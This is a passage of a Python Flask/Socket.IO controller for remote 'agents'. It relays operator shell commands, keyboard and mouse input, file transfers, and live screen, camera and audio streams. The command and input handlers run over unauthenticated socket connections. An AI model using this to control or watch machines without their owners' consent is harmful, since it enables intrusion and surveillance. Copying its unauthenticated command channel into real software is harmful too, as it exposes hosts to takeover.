@app.route('/api/settings/reset', methods=['POST'])
@require_auth
def reset_settings():
    """Reset settings to default values"""
    defaults = json.loads(json.dumps(DEFAULT_SETTINGS))
    if not save_settings(defaults):
        return jsonify({'success': False, 'message': 'Failed to reset settings'}), 500
    # Apply a safe subset immediately
    WEBRTC_CONFIG['enabled'] = defaults['webrtc']['enabled']
    WEBRTC_CONFIG['ice_servers'] = defaults['webrtc']['iceServers']
    return jsonify({'success': True, 'message': 'Settings reset to defaults'})

# System Information API
@app.route('/api/system/info', methods=['GET'])
@require_auth
def get_system_info():
    """Get system information and status"""
    import platform
    
    # Base server info (always available)
    info = {
        'server': {
            'platform': platform.system(),
            'platform_release': platform.release(),
            'platform_version': platform.version(),
            'architecture': platform.machine(),
            'hostname': platform.node(),
            'python_version': platform.python_version()
        },
        'webrtc': {
            'available': WEBRTC_AVAILABLE,
            'active_connections': len(WEBRTC_PEER_CONNECTIONS),
            'active_streams': len(WEBRTC_STREAMS),
            'active_viewers': len(WEBRTC_VIEWERS)
        },
        'agents': {
            'total': len(AGENTS_DATA),
            'online': len([a for a in AGENTS_DATA.values() if a.get('sid')]),
            'platforms': list(set([data.get('platform', 'Unknown') for data in AGENTS_DATA.values()]))
        }
    }
    
    # Try to add performance info if psutil is available
    try:
        import psutil
        
        # Get detailed system information
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        # Get CPU information
        cpu_count = psutil.cpu_count()
        cpu_freq = psutil.cpu_freq()
        cpu_freq_ghz = round(cpu_freq.current / 1000, 2) if cpu_freq else 0
        
        # Get memory information in GB
        memory_total_gb = round(memory.total / (1024**3), 1)
        memory_used_gb = round(memory.used / (1024**3), 1)
        memory_available_gb = round(memory.available / (1024**3), 1)
        
        # Get disk information in GB
        disk_total_gb = round(disk.total / (1024**3), 1)
        disk_used_gb = round(disk.used / (1024**3), 1)
        disk_free_gb = round(disk.free / (1024**3), 1)
        
        # Get network information
        network_io = psutil.net_io_counters()
        network_upload_mb = round(network_io.bytes_sent / (1024**2), 1)
        network_download_mb = round(network_io.bytes_recv / (1024**2), 1)
        
        info['performance'] = {
            'cpu_percent': cpu_percent,
            'cpu_cores': cpu_count,
            'cpu_frequency_ghz': cpu_freq_ghz,
            'memory_percent': memory.percent,
            'memory_total_gb': memory_total_gb,
            'memory_used_gb': memory_used_gb,
            'memory_available_gb': memory_available_gb,
            'disk_percent': round((disk.used / disk.total) * 100, 1),
            'disk_total_gb': disk_total_gb,
            'disk_used_gb': disk_used_gb,
            'disk_free_gb': disk_free_gb,
            'network_upload_mb': network_upload_mb,
            'network_download_mb': network_download_mb,
            'boot_time': psutil.boot_time()
        }
    except ImportError:
        # psutil not available, provide placeholder data
        info['performance'] = {
            'cpu_percent': 0,
            'cpu_cores': 0,
            'cpu_frequency_ghz': 0,
            'memory_percent': 0,
            'memory_total_gb': 0,
            'memory_used_gb': 0,
            'memory_available_gb': 0,
            'disk_percent': 0,
            'disk_total_gb': 0,
            'disk_used_gb': 0,
            'disk_free_gb': 0,
            'network_upload_mb': 0,
            'network_download_mb': 0,
            'boot_time': 0,
            'error': 'psutil not available'
        }
    except Exception as e:
        # Other psutil errors (permissions, etc.)
        info['performance'] = {
            'cpu_percent': 0,
            'memory_percent': 0,
            'disk_percent': 0,
            'boot_time': 0,
            'error': f'Performance data unavailable: {str(e)}'
        }
    
    return jsonify(info)

@app.route('/api/debug/agents', methods=['GET'])
@require_auth
def debug_agents():
    """Debug endpoint to see raw agent data"""
    return jsonify({
        'agents_data': AGENTS_DATA,
        'agent_count': len(AGENTS_DATA),
        'agent_keys': list(AGENTS_DATA.keys())
    })

@app.route('/api/debug/broadcast-agents', methods=['POST'])
@require_auth
def broadcast_agents():
    """Manually broadcast agent list to all operators"""
    try:
        socketio.emit('agent_list_update', AGENTS_DATA, room='operators')
        return jsonify({
            'success': True,
            'message': f'Agent list broadcast to operators room',
            'agent_count': len(AGENTS_DATA),
            'agents': list(AGENTS_DATA.keys())
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

# Video/Audio Frame Storage
VIDEO_FRAMES_H264 = defaultdict(lambda: None)
CAMERA_FRAMES_H264 = defaultdict(lambda: None)
AUDIO_FRAMES_OPUS = defaultdict(lambda: None)

# --- Socket.IO Event Handlers ---

@socketio.on('connect')
def handle_connect():
    # Note: Socket.IO doesn't have direct access to Flask session
    # In a production environment, you'd want to implement proper Socket.IO authentication
    # For now, we'll allow connections but validate on specific events
    client_info = {
        'sid': request.sid,
        'remote_addr': request.environ.get('REMOTE_ADDR', 'unknown'),
        'user_agent': request.environ.get('HTTP_USER_AGENT', 'unknown')
    }
    print(f"Client connected: {client_info}")

@socketio.on('disconnect')
def handle_disconnect():
    # Find which agent disconnected and remove it
    disconnected_agent_id = None
    disconnected_agent_name = None
    
    for agent_id, data in AGENTS_DATA.items():
        if data["sid"] == request.sid:
            disconnected_agent_id = agent_id
            disconnected_agent_name = data.get("name", f"Agent-{agent_id}")
            break
    
    if disconnected_agent_id:
        del AGENTS_DATA[disconnected_agent_id]
        emit('agent_list_update', AGENTS_DATA, room='operators', broadcast=True)
        
        # Log activity
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'connection',
            'action': 'Agent Disconnected',
            'details': f'Agent {disconnected_agent_id} disconnected',
            'agent_id': disconnected_agent_id,
            'agent_name': disconnected_agent_name,
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'warning'
        }, room='operators', broadcast=True)
        
        print(f"Agent {disconnected_agent_id} disconnected.")
    else:
        print(f"Operator client disconnected: {request.sid}")

@socketio.on('operator_connect')
def handle_operator_connect():
    """When a web dashboard connects."""
    print(f"Operator dashboard connecting with SID: {request.sid}")
    join_room('operators')
    print(f"Operator joined 'operators' room. Sending {len(AGENTS_DATA)} agents to new operator.")
    print(f"Current agents: {list(AGENTS_DATA.keys())}")
    
    # Send agent list to the specific operator that just connected
    emit('agent_list_update', AGENTS_DATA, room=request.sid)
    # Confirm room joining
    emit('joined_room', 'operators', room=request.sid)

@socketio.on('join_room')
def handle_join_room(room_name):
    """Handle explicit room joining requests."""
    print(f"🔍 Controller: Client {request.sid} requesting to join room: {room_name}")
    join_room(room_name)
    print(f"🔍 Controller: Client {request.sid} joined room: {room_name}")
    emit('joined_room', room_name, room=request.sid)
    
    # If joining operators room, also send agent list
    if room_name == 'operators':
        emit('agent_list_update', AGENTS_DATA, room=request.sid)
        print(f"Agent list sent to operator {request.sid}")

def _emit_agent_config(agent_id: str):
    return

@socketio.on('request_agent_list')
def handle_request_agent_list():
    """Handle explicit request for agent list from dashboard"""
    print(f"Agent list requested by {request.sid}")
    print(f"Current agents: {list(AGENTS_DATA.keys())}")
    print(f"Agent data: {AGENTS_DATA}")
    emit('agent_list_update', AGENTS_DATA, room=request.sid)
    print(f"Agent list sent to {request.sid}")

@socketio.on('agent_connect')
def handle_agent_connect(data):
    """When an agent connects and registers itself."""
    try:
        if not data or not isinstance(data, dict):
            print(f"Invalid agent_connect data received: {data}")
            return
            
        agent_id = data.get('agent_id')
        if not agent_id:
            print("Agent connection attempt without agent_id")
            return
        
        # Store agent information
        # Create agent entry if it doesn't exist
        if agent_id not in AGENTS_DATA:
            AGENTS_DATA[agent_id] = {}
            
        AGENTS_DATA[agent_id]["sid"] = request.sid
        AGENTS_DATA[agent_id]["last_seen"] = datetime.datetime.utcnow().isoformat() + "Z"
        AGENTS_DATA[agent_id]["name"] = data.get('name', f'Agent-{agent_id}')
        AGENTS_DATA[agent_id]["platform"] = data.get('platform', 'Unknown')
        AGENTS_DATA[agent_id]["ip"] = data.get('ip', request.environ.get('REMOTE_ADDR', '0.0.0.0'))
        AGENTS_DATA[agent_id]["capabilities"] = data.get('capabilities', ['screen', 'files', 'commands'])
        AGENTS_DATA[agent_id]["cpu_usage"] = data.get('cpu_usage', 0)
        AGENTS_DATA[agent_id]["memory_usage"] = data.get('memory_usage', 0)
        AGENTS_DATA[agent_id]["network_usage"] = data.get('network_usage', 0)
        AGENTS_DATA[agent_id]["system_info"] = data.get('system_info', {})
        AGENTS_DATA[agent_id]["uptime"] = data.get('uptime', 0)
        
        # Notify all operators of the new agent
        emit('agent_list_update', AGENTS_DATA, room='operators', broadcast=True)
        
        # Log activity
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'connection',
            'action': 'Agent Connected',
            'details': f'Agent {agent_id} successfully connected',
            'agent_id': agent_id,
            'agent_name': AGENTS_DATA[agent_id]["name"],
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'success'
        }, room='operators', broadcast=True)
        print(f"Agent {agent_id} connected with SID {request.sid}")
        print(f"🔍 Controller: Agent registration successful. AGENTS_DATA now contains: {list(AGENTS_DATA.keys())}")
    except Exception as e:
        print(f"Error handling agent_connect: {e}")
        emit('registration_error', {'message': 'Failed to register agent'}, room=request.sid)

@socketio.on('execute_command')
def handle_execute_command(data):
    """Operator issues a command to an agent."""
    agent_id = data.get('agent_id')
    command = data.get('command')
    
    print(f"🔍 Controller: execute_command received for agent {agent_id}, command: {command}")
    print(f"🔍 Controller: Current AGENTS_DATA: {list(AGENTS_DATA.keys())}")
    
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        # Generate execution ID for tracking
        execution_id = f"exec_{int(time.time())}_{secrets.token_hex(4)}"
        
        emit('command', {
            'command': command,
            'execution_id': execution_id
        }, room=agent_sid)
        print(f"🔍 Controller: Sent command '{command}' to agent {agent_id} with execution_id {execution_id}")
    else:
        print(f"🔍 Controller: Agent {agent_id} not found or disconnected. Available agents: {list(AGENTS_DATA.keys())}")
        emit('status_update', {'message': f'Agent {agent_id} not found or disconnected.', 'type': 'error'}, room=request.sid)

@socketio.on('process_list')
def handle_process_list(data):
    """Agent sends structured process list; relay to operators."""
    agent_id = data.get('agent_id')
    processes = data.get('processes', [])
    emit('process_list', {'agent_id': agent_id, 'processes': processes}, room='operators', broadcast=True)

@socketio.on('file_list')
def handle_file_list(data):
    """Agent sends structured directory listing; relay to operators."""
    agent_id = data.get('agent_id')
    path = data.get('path', '/')
    files = data.get('files', [])
    emit('file_list', {'agent_id': agent_id, 'path': path, 'files': files}, room='operators', broadcast=True)

@socketio.on('file_op_result')
def handle_file_op_result(data):
    """Relay file operation result to operators."""
    emit('file_op_result', data, room='operators', broadcast=True)

@socketio.on('command_output')
def handle_command_output(data):
    """Agent sends back the result of a command (legacy handler)."""
    agent_id = data.get('agent_id')
    output = data.get('output')
    
    # Forward the output to all operator dashboards
    emit('command_output', {'agent_id': agent_id, 'output': output}, room='operators', broadcast=True)
    print(f"Received output from {agent_id}: {output[:100]}...")

@socketio.on('agent_heartbeat')
def handle_agent_heartbeat(data):
    agent_id = data.get('agent_id')
    if agent_id in AGENTS_DATA:
        AGENTS_DATA[agent_id]['last_seen'] = datetime.datetime.utcnow().isoformat() + 'Z'

@socketio.on('ping')
def handle_ping(data):
    """Handle ping from agent and respond with pong"""
    agent_id = data.get('agent_id')
    timestamp = data.get('timestamp')
    uptime = data.get('uptime', 0)
    
    # Update agent data if it exists
    if agent_id in AGENTS_DATA:
        AGENTS_DATA[agent_id]['last_seen'] = datetime.datetime.utcnow().isoformat() + 'Z'
        AGENTS_DATA[agent_id]['uptime'] = uptime
        
        # Periodically update operators with agent status (every 10 pings to avoid spam)
        if not hasattr(handle_ping, 'ping_count'):
            handle_ping.ping_count = {}
        handle_ping.ping_count[agent_id] = handle_ping.ping_count.get(agent_id, 0) + 1
        
        if handle_ping.ping_count[agent_id] % 10 == 0:
            print(f"Updating operators with agent {agent_id} status after {handle_ping.ping_count[agent_id]} pings")
            emit('agent_list_update', AGENTS_DATA, room='operators', broadcast=True)
    
    # Send pong response
    emit('pong', {
        'agent_id': agent_id,
        'timestamp': timestamp,
        'server_time': datetime.datetime.utcnow().isoformat() + 'Z',
        'status': 'ok'
    })
    print(f"Ping received from {agent_id}, sent pong")

@socketio.on('agent_register')
def handle_agent_register(data):
    """Handle agent registration"""
    try:
        if not data or not isinstance(data, dict):
            print(f"Invalid agent_register data received: {data}")
            emit('registration_error', {'message': 'Invalid registration data'})
            return
            
        agent_id = data.get('agent_id')
        platform = data.get('platform', 'unknown')
        python_version = data.get('python_version', 'unknown')
        timestamp = data.get('timestamp')
        
        if not agent_id:
            emit('registration_error', {'message': 'Agent ID required'})
            return
        
        # Add agent to data with all required fields for dashboard
        AGENTS_DATA[agent_id] = {
            'agent_id': agent_id,
            'sid': request.sid,
            'name': f'Agent-{agent_id}',
            'platform': platform,
            'python_version': python_version,
            'ip': request.environ.get('REMOTE_ADDR', '0.0.0.0'),
            'connected_at': datetime.datetime.utcnow().isoformat() + 'Z',
            'last_seen': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'online',
            'capabilities': ['screen', 'files', 'commands'],
            'cpu_usage': 0,
            'memory_usage': 0,
            'network_usage': 0,
            'system_info': {
                'platform': platform,
                'python_version': python_version
            },
            'uptime': 0
        }
        
        print(f"Agent registered: {agent_id} ({platform})")
        print(f"Current agents: {list(AGENTS_DATA.keys())}")
        print(f"Emitting agent_list_update to operators room with {len(AGENTS_DATA)} agents")
        
        # Notify operators
        print(f"Broadcasting agent_list_update to operators room with agent data: {list(AGENTS_DATA.keys())}")
        emit('agent_list_update', AGENTS_DATA, room='operators', broadcast=True)
        
        # Log activity for operators
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'connection',
            'action': 'Agent Connected',
            'details': f'Agent {agent_id} successfully registered',
            'agent_id': agent_id,
            'agent_name': AGENTS_DATA[agent_id]["name"],
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'success'
        }, room='operators', broadcast=True)
        
        # Send registration confirmation
        emit('agent_registered', {
            'agent_id': agent_id,
            'status': 'success',
            'message': 'Agent registered successfully'
        })
        
        print(f"Agent registration complete for {agent_id}")
        
    except Exception as e:
        print(f"Error handling agent_register: {e}")
        emit('registration_error', {'message': 'Registration failed due to server error'})

@socketio.on('live_key_press')
def handle_live_key_press(data):
    """Operator sends a live key press to an agent."""
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('key_press', data, room=agent_sid, include_self=False)

@socketio.on('live_mouse_move')
def handle_live_mouse_move(data):
    """Operator sends a live mouse move to an agent."""
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('mouse_move', data, room=agent_sid, include_self=False)

@socketio.on('live_mouse_click')
def handle_live_mouse_click(data):
    """Operator sends a live mouse click to an agent."""
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('mouse_click', data, room=agent_sid, include_self=False)

# --- Chunked File Transfer Handlers ---
@socketio.on('upload_file_chunk')
def handle_upload_file_chunk(data):
    agent_id = data.get('agent_id')
    filename = data.get('filename')
    chunk = data.get('chunk_data') or data.get('data') or data.get('chunk')
    offset = data.get('offset')
    total_size = data.get('total_size', 0)  # ✅ Get total_size from UI
    destination_path = data.get('destination_path')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('file_chunk_from_operator', {
            'agent_id': agent_id,
            'filename': filename,
            'data': chunk,
            'chunk': chunk,
            'chunk_data': chunk,
            'offset': offset,
            'total_size': total_size,  # ✅ Forward total_size to agent!
            'destination_path': destination_path
        }, room=agent_sid)
        print(f"📤 Forwarding upload chunk: {filename} offset {offset}, total_size {total_size}")

@socketio.on('upload_file_end')
def handle_upload_file_end(data):
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('file_upload_complete_from_operator', data, room=agent_sid)
        print(f"Upload of {data.get('filename')} to {agent_id} complete.")

@socketio.on('download_file')
def handle_download_file(data):
    agent_id = data.get('agent_id')
    filename = data.get('filename')
    local_path = data.get('local_path')
    download_id = data.get('download_id') or filename
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        print(f"Requesting download of '{filename}' from {agent_id} to local path {local_path}")
        if download_id not in DOWNLOAD_BUFFERS:
            DOWNLOAD_BUFFERS[download_id] = {"chunks": [], "total_size": 0, "local_path": None}
        DOWNLOAD_BUFFERS[download_id]["local_path"] = local_path
        emit('request_file_chunk_from_agent', {'filename': filename, 'download_id': download_id}, room=agent_sid)
    else:
        emit('status_update', {'message': f'Agent {agent_id} not found.', 'type': 'error'}, room=request.sid)

@socketio.on('file_chunk_from_agent')
def handle_file_chunk_from_agent(data):
    agent_id = data.get('agent_id')
    filename = data.get('filename')
    download_id = data.get('download_id') or filename
    chunk = data.get('chunk')
    offset = data.get('offset')
    total_size = data.get('total_size')
    error = data.get('error')

    if error:
        emit('file_download_chunk', {'agent_id': agent_id, 'filename': filename, 'download_id': download_id, 'error': error}, room='operators')
        if download_id in DOWNLOAD_BUFFERS: del DOWNLOAD_BUFFERS[download_id]
        return

    if download_id not in DOWNLOAD_BUFFERS:
        DOWNLOAD_BUFFERS[download_id] = {"chunks": [], "total_size": total_size, "local_path": None}

    if isinstance(chunk, str):
        payload = chunk.split(',', 1)[1] if ',' in chunk else chunk
        DOWNLOAD_BUFFERS[download_id]["chunks"].append(base64.b64decode(payload))
    DOWNLOAD_BUFFERS[download_id]["total_size"] = total_size # Update total size in case it was not set initially

    current_download_size = sum(len(c) for c in DOWNLOAD_BUFFERS[download_id]["chunks"])

    # If all chunks received, save the file locally
    if current_download_size >= total_size:
        full_content = b"".join(DOWNLOAD_BUFFERS[download_id]["chunks"])
        local_path = DOWNLOAD_BUFFERS[download_id]["local_path"]

        if local_path:
            try:
                # Ensure directory exists
                os.makedirs(os.path.dirname(local_path), exist_ok=True)
                with open(local_path, 'wb') as f:
                    f.write(full_content)
                print(f"Successfully downloaded {filename} to {local_path}")
                emit('file_download_chunk', {
                    'agent_id': agent_id,
                    'filename': filename,
                    'download_id': download_id,
                    'chunk': chunk,
                    'offset': offset,
                    'total_size': total_size,
                    'local_path': local_path # Pass local_path back to frontend
                }, room='operators')
            except Exception as e:
                print(f"Error saving downloaded file {filename} to {local_path}: {e}")
                emit('file_download_chunk', {'agent_id': agent_id, 'filename': filename, 'error': f'Error saving to local path: {e}'}, room='operators')
        else:
            # If no local_path was specified, send the chunks to the frontend for browser download
            emit('file_download_chunk', {
                'agent_id': agent_id,
                'filename': filename,
                'download_id': download_id,
                'chunk': chunk,
                'offset': offset,
                'total_size': total_size
            }, room='operators')
        
        del DOWNLOAD_BUFFERS[download_id]
    else:
        # Continue sending chunks to frontend for progress update
        emit('file_download_chunk', {
            'agent_id': agent_id,
            'filename': filename,
            'download_id': download_id,
            'chunk': chunk,
            'offset': offset,
            'total_size': total_size
        }, room='operators')

@socketio.on('file_upload_progress')
def handle_file_upload_progress(data):
    """Forward file upload progress from agent to UI"""
    print(f"📊 Upload progress: {data.get('filename')} - {data.get('progress')}%")
    emit('file_upload_progress', data, room='operators')

@socketio.on('file_upload_complete')
def handle_file_upload_complete(data):
    """Forward file upload completion from agent to UI"""
    print(f"✅ Upload complete: {data.get('filename')} ({data.get('size')} bytes)")
    emit('file_upload_complete', data, room='operators')

@socketio.on('file_download_progress')
def handle_file_download_progress(data):
    """Forward file download progress from agent to UI"""
    print(f"📊 Download progress: {data.get('filename')} - {data.get('progress')}%")
    emit('file_download_progress', data, room='operators')

@socketio.on('file_download_complete')
def handle_file_download_complete(data):
    """Forward file download completion from agent to UI"""
    print(f"✅ Download complete: {data.get('filename')} ({data.get('size')} bytes)")
    emit('file_download_complete', data, room='operators')

# Global variables for WebRTC and video streaming
WEBRTC_PEER_CONNECTIONS = {}
WEBRTC_VIEWER_CONNECTIONS = {}
VIDEO_FRAMES_H264 = defaultdict(lambda: None)
CAMERA_FRAMES_H264 = defaultdict(lambda: None)
AUDIO_FRAMES_OPUS = defaultdict(lambda: None)

@socketio.on('screen_frame')
def handle_screen_frame(data):
    """Accept H.264 (or JPEG for fallback) binary frames from agent via socket.io."""
    agent_id = data.get('agent_id')
    frame = data.get('frame')
    if agent_id and frame:
        VIDEO_FRAMES_H264[agent_id] = frame  # Store latest frame for this agent
        # Forward frame to operators room for real-time streaming
        emit('screen_frame', data, room='operators')

@socketio.on('request_video_frame')
def handle_request_video_frame(data):
    agent_id = data.get('agent_id')
    if agent_id and agent_id in VIDEO_FRAMES_H264:
        frame = VIDEO_FRAMES_H264[agent_id]
        # Send as base64 for browser demo; in production, use ArrayBuffer/binary
        emit('video_frame', {'frame': base64.b64encode(frame).decode('utf-8')})

@socketio.on('request_audio_frame')
def handle_request_audio_frame(data):
    agent_id = data.get('agent_id')
    if agent_id and agent_id in AUDIO_FRAMES_OPUS:
        frame = AUDIO_FRAMES_OPUS[agent_id]
        # Send as base64 for browser demo; in production, use ArrayBuffer/binary
        emit('audio_frame', {'frame': base64.b64encode(frame).decode('utf-8')})

@socketio.on('request_camera_frame')
def handle_request_camera_frame(data):
    agent_id = data.get('agent_id')
    if agent_id and agent_id in CAMERA_FRAMES_H264:
        frame = CAMERA_FRAMES_H264[agent_id]
        # Send as base64 for browser demo; in production, use ArrayBuffer/binary
        emit('camera_frame', {'frame': base64.b64encode(frame).decode('utf-8')})



@socketio.on('camera_frame')
def handle_camera_frame(data):
    agent_id = data.get('agent_id')
    frame = data.get('frame')
    if agent_id and frame:
        CAMERA_FRAMES_H264[agent_id] = frame
        # Forward frame to operators room for real-time streaming
        emit('camera_frame', data, room='operators')

@socketio.on('audio_frame')
def handle_audio_frame(data):
    agent_id = data.get('agent_id')
    frame = data.get('frame')
    if agent_id and frame:
        AUDIO_FRAMES_OPUS[agent_id] = frame
        # Forward frame to operators room for real-time streaming
        emit('audio_frame', data, room='operators')

@socketio.on('agent_telemetry')
def handle_agent_telemetry(data):
    """Telemetry from agent; update AGENTS_DATA and relay summary to operators."""
    agent_id = data.get('agent_id')
    if agent_id in AGENTS_DATA:
        AGENTS_DATA[agent_id]['cpu_usage'] = data.get('cpu', 0)
        AGENTS_DATA[agent_id]['memory_usage'] = data.get('memory', 0)
        AGENTS_DATA[agent_id]['network_usage'] = data.get('network', 0)
        emit('agent_list_update', AGENTS_DATA, room='operators', broadcast=True)

# --- WebRTC Socket.IO Event Handlers ---

@socketio.on('webrtc_offer')
def handle_webrtc_offer(data):
    """Handle WebRTC offer from agent"""
    agent_id = data.get('agent_id')
    offer_sdp = data.get('offer')
    
    if not agent_id or not offer_sdp:
        emit('webrtc_error', {'message': 'Invalid offer data'}, room=request.sid)
        return
    
    try:
        # Create or get existing peer connection
        if agent_id not in WEBRTC_PEER_CONNECTIONS:
            pc = create_webrtc_peer_connection(agent_id)
            if not pc:
                emit('webrtc_error', {'message': 'Failed to create peer connection'}, room=request.sid)
                return
        else:
            pc = WEBRTC_PEER_CONNECTIONS[agent_id]
        
        # Set remote description (offer)
        offer = RTCSessionDescription(sdp=offer_sdp, type='offer')
        
        # Use proper async handling for WebRTC operations
        def handle_webrtc_offer_async():
            try:
                loop = asyncio.get_event_loop()
                # Set remote description
                asyncio.run_coroutine_threadsafe(pc.setRemoteDescription(offer), loop)
                # Create answer
                future = asyncio.run_coroutine_threadsafe(pc.createAnswer(), loop)
                future.add_done_callback(lambda f: handle_answer_created(f, agent_id, request.sid))
            except RuntimeError:
                # No event loop, run synchronously
                async def async_operations():
                    await pc.setRemoteDescription(offer)
                    answer = await pc.createAnswer()
                    handle_answer_created_sync(answer, agent_id, request.sid)
                asyncio.run(async_operations())
        
        # Run in thread to avoid blocking
        import threading
        threading.Thread(target=handle_webrtc_offer_async, daemon=True).start()
        
        print(f"WebRTC offer received from {agent_id}")
        
    except Exception as e:
        print(f"Error handling WebRTC offer from {agent_id}: {e}")
        emit('webrtc_error', {'message': f'Error processing offer: {str(e)}'}, room=request.sid)

def handle_answer_created(future, agent_id, sid):
    """Handle WebRTC answer creation"""
    try:
        answer = future.result()
        
        # Use proper async handling for setLocalDescription
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(WEBRTC_PEER_CONNECTIONS[agent_id].setLocalDescription(answer), loop)
        except RuntimeError:
            # No event loop, run synchronously
            async def set_local_desc():
                await WEBRTC_PEER_CONNECTIONS[agent_id].setLocalDescription(answer)
            asyncio.run(set_local_desc())
        
        # Send answer back to agent
        socketio.emit('webrtc_answer', {
            'answer': answer.sdp,
            'type': answer.type
        }, room=sid)
        
        print(f"WebRTC answer sent to {agent_id}")
        
    except Exception as e:
        print(f"Error creating WebRTC answer for {agent_id}: {e}")
        socketio.emit('webrtc_error', {'message': f'Error creating answer: {str(e)}'}, room=sid)

def handle_answer_created_sync(answer, agent_id, sid):
    """Handle WebRTC answer creation for synchronous context"""
    try:
        # Send answer back to agent
        socketio.emit('webrtc_answer', {
            'answer': answer.sdp,
            'type': answer.type
        }, room=sid)
        
        print(f"WebRTC answer sent to {agent_id}")
        
    except Exception as e:
        print(f"Error sending WebRTC answer for {agent_id}: {e}")
        socketio.emit('webrtc_error', {'message': f'Error sending answer: {str(e)}'}, room=sid)

@socketio.on('webrtc_ice_candidate')
def handle_webrtc_ice_candidate(data):
    """Handle ICE candidate from agent"""
    agent_id = data.get('agent_id')
    candidate = data.get('candidate')
    
    if not agent_id or not candidate or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return
    
    try:
        pc = WEBRTC_PEER_CONNECTIONS[agent_id]
        
        # Use proper async handling for addIceCandidate
        try:
            loop = asyncio.get_event_loop()
            asyncio.run_coroutine_threadsafe(pc.addIceCandidate(candidate), loop)
        except RuntimeError:
            # No event loop, run synchronously
            async def add_ice_candidate():
                await pc.addIceCandidate(candidate)
            asyncio.run(add_ice_candidate())
            
        print(f"ICE candidate added for {agent_id}")
        
    except Exception as e:
        print(f"Error adding ICE candidate for {agent_id}: {e}")

# @socketio.on('webrtc_start_streaming')
# def handle_webrtc_start_streaming(data):
#     """Handle WebRTC streaming start request"""
#     agent_id = data.get('agent_id')
#     stream_type = data.get('type', 'all')  # screen, audio, camera, all
#     
#     if not agent_id:
#         emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
#         return
#     
#     try:
#         # Ensure peer connection exists
#         if agent_id not in WEBRTC_PEER_CONNECTIONS:
#             pc = create_webrtc_peer_connection(agent_id)
#             if not pc:
#                 emit('webrtc_error', {'message': 'Failed to create peer connection'}, room=request.sid)
#                 return
#         
#         # Notify agent to start WebRTC streaming
#         emit('start_webrtc_streaming', {
#             'type': stream_type,
#             'ice_servers': WEBRTC_CONFIG['ice_servers'],
#             'codecs': WEBRTC_CONFIG['codecs']
#         }, room=request.sid)
#         
#         print(f"WebRTC streaming started for {agent_id} ({stream_type})")
#         
#     except Exception as e:
#         print(f"Error starting WebRTC streaming for {agent_id}: {e}")
#         emit('webrtc_error', {'message': f'Error starting streaming: {str(e)}'}, room=request.sid)

# @socketio.on('webrtc_stop_streaming')
# def handle_webrtc_stop_streaming(data):
#     """Handle WebRTC streaming stop request"""
#     agent_id = data.get('agent_id')
#     
#     if not agent_id:
#         emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
#         return
#     
#     try:
#         # Close WebRTC connection
#         close_webrtc_connection(agent_id)
#         
#         # Notify agent to stop WebRTC streaming
#         emit('stop_webrtc_streaming', {}, room=request.sid)
#         
#         print(f"WebRTC streaming stopped for {agent_id}")
#         
#     except Exception as e:
#         print(f"Error stopping WebRTC streaming for {agent_id}: {e}")
#         emit('webrtc_error', {'message': f'Error stopping streaming: {str(e)}'}, room=request.sid)

@socketio.on('webrtc_get_stats')
def handle_webrtc_get_stats(data):
    """Handle WebRTC stats request"""
    agent_id = data.get('agent_id')
    
    if not agent_id:
        emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        stats = get_webrtc_stats(agent_id)
        if stats:
            emit('webrtc_stats', stats, room=request.sid)
        else:
            emit('webrtc_error', {'message': 'No WebRTC connection found'}, room=request.sid)
        
    except Exception as e:
        print(f"Error getting WebRTC stats for {agent_id}: {e}")
        emit('webrtc_error', {'message': f'Error getting stats: {str(e)}'}, room=request.sid)

@socketio.on('webrtc_set_quality')
def handle_webrtc_set_quality(data):
    """Handle WebRTC quality settings"""
    agent_id = data.get('agent_id')
    quality = data.get('quality', 'auto')  # low, medium, high, auto
    
    if not agent_id:
        emit('webrtc_error', {'message': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        # Forward quality setting to agent
        emit('set_webrtc_quality', {'quality': quality}, room=request.sid)
        print(f"WebRTC quality set to {quality} for {agent_id}")
        
    except Exception as e:
        print(f"Error setting WebRTC quality for {agent_id}: {e}")
        emit('webrtc_error', {'message': f'Error setting quality: {str(e)}'}, room=request.sid)

# --- WebRTC Viewer Management ---

@socketio.on('webrtc_viewer_connect')
def handle_webrtc_viewer_connect(data):
    """Handle WebRTC viewer connection"""
    viewer_id = request.sid
    agent_id = data.get('agent_id')
    
    if not agent_id or agent_id not in WEBRTC_STREAMS:
        emit('webrtc_error', {'message': 'Agent not available for WebRTC'}, room=request.sid)
        return
    
    try:
        # Create viewer peer connection
        viewer_pc = RTCPeerConnection()
        
        # Configure ICE servers
        for ice_server in WEBRTC_CONFIG['ice_servers']:
            viewer_pc.addIceServer(ice_server)
        
        # Store viewer data
        WEBRTC_VIEWERS[viewer_id] = {
            'agent_id': agent_id,
            'pc': viewer_pc,
            'streams': {}
        }
        
        # Add existing tracks from agent
        agent_streams = WEBRTC_STREAMS[agent_id]
        for track_kind, track in agent_streams.items():
            try:
                sender = viewer_pc.addTrack(track)
